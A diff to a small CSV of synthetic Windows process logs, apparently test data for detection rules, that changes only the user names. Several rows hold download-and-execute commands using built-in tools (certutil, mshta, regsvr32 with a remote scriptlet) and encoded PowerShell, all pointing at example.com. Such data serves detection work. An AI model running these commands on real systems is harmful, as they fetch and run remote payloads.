@@ -1,11 +1,11 @@
 timestamp,computer,user,Image,command_line
 2026-11-19 08:00:00,SRV-01,Admin,C:\Windows\System32\whoami.exe,whoami
 2026-11-19 08:03:00,SRV-01,Admin,C:\Windows\System32\powershell.exe,powershell.exe -enc SQBFAFgA
-2026-11-19 08:06:00,PC-22,John,C:\Windows\System32\notepad.exe,notepad.exe
-2026-11-19 08:09:00,PC-33,Alice,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f https://example.com/a.exe
-2026-11-19 08:12:00,PC-22,John,C:\Windows\System32\powershell.exe,powershell Get-Process
-2026-11-19 08:15:00,PC-44,Bob,C:\Windows\System32\mshta.exe,mshta.exe https://example.com/a.hta
-2026-11-19 08:18:00,PC-33,Alice,C:\Windows\System32\certutil.exe,certutil -store My
-2026-11-19 08:21:00,PC-44,Bob,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:https://example.com/a.sct scrobj.dll
-2026-11-19 08:24:00,PC-55,David,C:\Windows\System32\cmd.exe,echo powershell -enc
+2026-11-19 08:06:00,PC-22,Pedro,C:\Windows\System32\notepad.exe,notepad.exe
+2026-11-19 08:09:00,PC-33,Hafidh,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f https://example.com/a.exe
+2026-11-19 08:12:00,PC-22,userA,C:\Windows\System32\powershell.exe,powershell Get-Process
+2026-11-19 08:15:00,PC-44,userB,C:\Windows\System32\mshta.exe,mshta.exe https://example.com/a.hta
+2026-11-19 08:18:00,PC-33,Hafidh,C:\Windows\System32\certutil.exe,certutil -store My
+2026-11-19 08:21:00,PC-44,userB,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:https://example.com/a.sct scrobj.dll
+2026-11-19 08:24:00,PC-55,Gomes,C:\Windows\System32\cmd.exe,echo powershell -enc
 2026-11-19 08:27:00,SRV-02,Admin,C:\Windows\System32\pwsh.exe,pwsh -EncodedCommand SQBFAFgA
